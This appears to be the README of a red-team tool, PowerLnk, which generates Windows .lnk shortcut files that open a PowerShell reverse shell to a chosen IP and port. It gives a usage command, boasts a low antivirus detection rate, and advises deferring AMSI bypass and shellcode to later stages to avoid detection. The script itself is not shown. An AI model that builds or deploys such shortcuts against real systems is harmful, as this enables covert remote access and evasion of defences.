# PowerLnk
generates a .Lnk file that executes a reverse shell in powershell

# Useage
script takes two parameters -ip and -port where ip and port is the device you are listening on

./PowerLnk.ps1 -ip '192.168.1.5' -port 443

# Current detection

scored a 4/62 on virus total, intended for second stagers to be executed after initial callback due to including more to the lnk increases detections, so amsi, shellcode etc should be run after inital callback. I'll leave that up to yall to implement that for whatever engagement you're doing.


I'm working on a python server side console for c2
